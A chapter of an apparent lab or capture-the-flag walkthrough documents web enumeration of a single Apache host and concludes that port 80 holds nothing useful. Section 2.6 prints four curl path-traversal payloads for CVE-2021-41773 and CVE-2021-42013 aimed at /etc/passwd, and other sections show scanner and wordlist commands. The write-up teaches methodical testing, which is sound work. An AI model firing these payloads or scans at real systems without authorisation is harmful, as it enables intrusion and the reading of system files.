# 02 — Web enumeration (the dead end)

Port 80 is the obvious target on a box with only three services, so it deserves a real attempt —
but a bounded one. The skill being practised here is **knowing when to stop**, and being able to
justify the stop with evidence rather than a hunch.

Spoiler: there is nothing here. The value of this chapter is the four independent negative results,
because together they justify walking away.

---

## 2.1 The root page

```bash
curl -s -i http://192.168.245.149/ | head -30
```

```
HTTP/1.1 200 OK
Date: Sat, 14 Nov 2026 23:07:54 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Mon, 21 Nov 2022 11:07:27 GMT
ETag: "2aa6-5edf90f9272c6"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
Content-Type: text/html
```

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" ...>
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
  -->
  <head>
    <title>Apache2 Ubuntu Default Page: It works</title>
```

**Reading it:**

- `Content-Length: 10918` and the ETag `2aa6-5edf90f9272c6` match the stock Ubuntu
  `index.html` byte-for-byte. This is the untouched package default, not a custom application.
- `Last-Modified: Mon, 21 Nov 2022` — the document root was populated at the same time as the
  box image was built (compare the FTP key timestamps later: also `Nov 21 2022`). Nothing has
  been deployed since.
- A browser user-agent returns the same 10918 bytes, so there is no content negotiation or
  mobile variant hiding something.

## 2.2 Cheap probes before brute force

Always do the short list first — it costs one loop and occasionally saves the whole chapter.

```bash
for p in robots.txt sitemap.xml index.php index.html .git/ .htaccess \
         server-status manual/ phpinfo.php info.php; do
  code=$(curl -s -o /dev/null -w "%{http_code} %{size_download}" --max-time 5 \
    "http://192.168.245.149/$p")
  echo "$code  /$p"
done
```

```
404 277  /robots.txt
404 277  /sitemap.xml
404 277  /index.php
200 10918  /index.html
404 277  /.git/
403 280  /.htaccess
403 280  /server-status
404 277  /manual/
404 277  /phpinfo.php
404 277  /info.php
```

**Reading it:**

- Every 404 returns the same `277` bytes — a consistent Apache error document, which gives us a
  reliable size filter for the brute-force step.
- There is **no PHP**: `/index.php` 404s and `/phpinfo.php` 404s. Combined with
  `Content-Type: text/html` on the index, this is a static-only Apache. No `mod_php`, so no
  webshell path even after a file-write.
- `.htaccess` → `403` means the file exists as a *protected* file rather than being served. Normal
  hardening, not a finding.
- `/server-status` → `403` means `mod_status` is loaded but restricted to localhost. Worth a note;
  not exploitable from here.

## 2.3 Content discovery

Two wordlists, extensions included, generous thread count because the target is unthrottled.

```bash
feroxbuster -u http://192.168.245.149 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --status-codes 200,204,301,302,307,401,403 \
  --no-state -o ferox_raft.txt -q
```

```
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter
200      GET       15l       74w     6147c http://192.168.245.149/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://192.168.245.149/
```

Then the deeper pass, DirBuster 2.3 medium with common web extensions:

```bash
feroxbuster -u http://192.168.245.149 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip,tar.gz,old,conf,inc,sql -t 40 --no-state -q \
  -o /tmp/box149/ferox_deep.txt
```

Final result set after completion — three URLs total:

```
200      GET       15l       74w     6147c http://192.168.245.149/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://192.168.245.149/
200      GET      375l      964w    10918c http://192.168.245.149/index.html
```

**Reading it:** the only things that exist are the stock page and the stock icon. `--smart`
auto-filtered the uniform 277-byte 404, so nothing is hidden behind soft-404 noise. This is as
close to proof of "no web content" as you get without reading the docroot.

## 2.4 Virtual hosts

A default page on the IP does not rule out a named vhost with real content. Two resolutions
(`Host: FUZZ` and `Host: FUZZ.local`), 5000-entry subdomain list, filtering the default page body.

```bash
ffuf -u http://192.168.245.149/ -H "Host: FUZZ" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc all -fr "Apache2 Ubuntu Default Page" -t 40 -s
```

No hits. The same with `Host: FUZZ.local` also returned nothing.

**Reading it:** Apache is configured with a single default vhost. There is no second application
reachable by hostname.

## 2.5 Scanner cross-check

```bash
nikto -h http://192.168.245.149 -nointeractive
```

```
+ Server: Apache/2.4.41 (Ubuntu)
+ [600050] Apache/2.4.41 appears to be outdated (current is at least 2.4.66).
+ [999984] /: Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5edf90f9272c6
+ [013587] /: Suggested security header missing: permissions-policy.
+ [013587] /: Suggested security header missing: x-content-type-options.
+ [013587] /: Suggested security header missing: referrer-policy.
+ [013587] /: Suggested security header missing: content-security-policy.
+ [013587] /: Suggested security header missing: strict-transport-security.
+ [999990] OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
```

**Reading it:** every item is generic hardening advice, not a vulnerability. Missing security
headers on a static default page are noise. `OPTIONS/HEAD/GET/POST` is the Apache default method
set — no dangerous methods like `PUT` or `DELETE`. `No CGI Directories found`, which matters for
the next test.

## 2.6 Checking the one plausible CVE

Apache 2.4.41 is old. The famous 2021 path-traversal pair targets 2.4.49 and 2.4.50, so this is
technically out of range — but Ubuntu backports, and the check is cheap. `--path-as-is` is
**mandatory**: without it curl normalises `%2e%2e` for you and the test silently does nothing.

```bash
# CVE-2021-41773 via the icons alias
curl -s --path-as-is "http://192.168.245.149/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-41773 via cgi-bin
curl -s --path-as-is "http://192.168.245.149/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-42013 double-encoding variant
curl -s --path-as-is \
  "http://192.168.245.149/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"

# from the document root
curl -s --path-as-is "http://192.168.245.149/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

All four:

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
```

**Reading it:** `400 Bad Request` rather than `403` or `404` is the patched behaviour. The
`apache2-bin` package version recorded in the SNMP software list confirms it:
`apache2_2.4.41-4ubuntu3.23_amd64` — the `3.23` revision includes the traversal fix backport.
Also note `/cgi-bin/` 404s from section 2.2, so the alias this exploit depends on does not even
exist.

---

## Conclusion — do not spend more time on port 80

Four independent lines of evidence:

1. **Byte-identical stock page**, timestamped to image build time, no PHP and no redirects.
2. **Two wordlists** (raft-medium, DirBuster 2.3 medium with 10 extensions) → only the stock page
   and stock icon; soft-404 filtered.
3. **No vhosts** across 5000 candidate names in two resolutions.
4. **The only plausible CVE is patched** (400, and the vulnerable package revision is confirmed
   from the installed-software list).

This is enough to write the service off and go where the evidence points: **UDP/161 SNMP**, which
the TCP-only view never showed.

→ [03 — SNMP](03-snmp.md)
